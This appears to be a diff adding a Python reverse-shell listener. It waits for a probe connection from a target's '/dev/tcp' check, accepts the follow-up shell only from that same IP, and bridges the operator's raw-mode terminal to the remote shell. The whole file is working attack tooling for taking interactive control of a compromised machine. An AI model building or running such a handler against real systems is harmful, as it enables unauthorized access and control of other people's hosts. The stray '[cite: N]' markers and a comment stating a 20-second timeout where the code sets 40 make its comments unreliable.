@@ -1,0 +1,92 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+import os
+import tty
+import termios
+import select
+import struct
+import fcntl
+
+# Configuration: Default port 4644, 20s initial timeout [cite: 1]
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4644
+TIMEOUT = 40 
+
+def get_term_size():
+    """Returns (rows, cols) of the current terminal[cite: 1]."""
+    s = struct.pack("HHHH", 0, 0, 0, 0)
+    res = fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, s)
+    rows, cols, x, y = struct.unpack("HHHH", res)
+    return rows, cols
+
+def main():
+    fd = sys.stdin.fileno()
+    old_settings = termios.tcgetattr(fd)
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.settimeout(TIMEOUT)
+    server.bind(('0.0.0.0', PORT)) # [cite: 2]
+    server.listen(1)
+
+    shell_conn = None
+
+    try:
+        print(f"[*] Listening on {PORT}... (Timeout {TIMEOUT}s)")
+        
+        # 1. CATCH THE PROBE (The 'true > /dev/tcp' check) [cite: 2]
+        probe_conn, addr = server.accept()
+        authorized_ip = addr[0]  # Lock onto the IP that probed us 
+        print(f"[*] Connection 1 (Probe) from {authorized_ip}.")
+        probe_conn.close() 
+
+        # 2. WAIT FOR THE SHELL (After the 2.5s delay) 
+        server.settimeout(10)
+        while True:
+            shell_conn, addr = server.accept() 
+            if addr[0] == authorized_ip:
+                # Verified: This matches the source of the probe 
+                break 
+            else:
+                # Ignore random network noise or other scanners 
+                print(f"[*] Ignoring unauthorized connection from {addr[0]}")
+                shell_conn.close()
+
+        # Get and display the window size 
+        rows, cols = get_term_size()
+        print(f"[*] Shell established from {authorized_ip}")
+        print(f"[*] Window size: {rows} rows, {cols} cols.")
+        print(f"[*] Tip: Run 'stty rows {rows} cols {cols}' inside the shell.")
+
+        # 3. ENTER RAW MODE 
+        tty.setraw(fd)
+        
+        # 4. DATA BRIDGE (Multiplexing Keyboard and Socket) 
+        while True:
+            r, w, e = select.select([shell_conn, sys.stdin], [], [])
+            
+            if shell_conn in r:
+                data = shell_conn.recv(4096) # [cite: 6]
+                if not data: break 
+                os.write(sys.stdout.fileno(), data)
+            
+            if sys.stdin in r:
+                data = os.read(fd, 4096)
+                if not data: break # [cite: 7]
+                shell_conn.sendall(data)
+
+    except (socket.timeout, TimeoutError):
+        print("\n[!] Timeout reached: No response.")
+    except KeyboardInterrupt:
+        print("\n[!] Stopped by user.")
+    finally:
+        # Restore terminal to original "cooked" state 
+        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+        if shell_conn: # 
+            shell_conn.close()
+        server.close()
+        print("\n[+] Terminal restored.")
+
+if __name__ == "__main__":
+    main()
